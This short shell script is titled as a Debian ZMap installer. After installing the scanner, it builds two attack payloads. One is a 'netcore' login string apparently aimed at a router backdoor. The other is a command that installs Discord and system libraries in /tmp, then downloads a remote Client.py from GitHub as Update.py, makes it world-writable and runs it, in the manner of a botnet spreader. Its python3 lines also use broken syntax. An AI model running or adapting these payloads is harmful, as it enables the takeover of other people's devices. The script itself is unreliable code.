#!/bin/sh
# Debian ZMap Install

sudo apt-get install build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev
sudo apt-get install zmap

cmake -DENABLE_HARDENING=ON

python3 -c ("print 'A'*8 + 'netcore\x00'") > loginpayload
python3 -c ("print 'cd /tmp && apt-get update && apt-get install curl && apt-get install python3 && apt-get install python3-pip -y && apt-get install iputils-ping -y && pip install discord && pip install tendo && pip install requests && pip install psutil && curl -o Update.py https://github.com/rxu7s/Public/raw/main/Client.py && chmod 777 Update.py && python3 Update.py'") > commandpayload